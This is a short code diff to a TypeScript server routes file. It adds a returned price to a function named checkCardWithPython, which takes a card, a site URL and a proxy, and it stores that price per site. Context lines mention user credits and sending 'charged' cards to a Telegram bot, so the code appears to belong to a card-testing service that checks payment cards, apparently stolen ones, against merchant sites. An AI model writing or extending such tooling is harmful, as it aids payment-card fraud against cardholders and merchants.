@@ -179,7 +179,7 @@ export async function registerRoutes(
     job.rejected = 0;
   };
 
-  const checkCardWithPython = (card: string, siteUrl: string, proxy: string, userId: number, onLog: (msg: string) => void): Promise<{status: string, message: string}> => {
+  const checkCardWithPython = (card: string, siteUrl: string, proxy: string, userId: number, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string}> => {
     return new Promise((resolve) => {
       const job = getUserJob(userId);
       
@@ -415,6 +415,11 @@ export async function registerRoutes(
             if (updatedUser) {
               broadcastToUser(userId, { type: WS_EVENTS.CREDITS_UPDATE, payload: { credits: updatedUser.credits } });
             }
+          }
+
+          // Save product price to site if available
+          if (result.price && siteId) {
+            await storage.updateSitePrice(siteId, result.price);
           }
 
           // Send charged card to Telegram bot
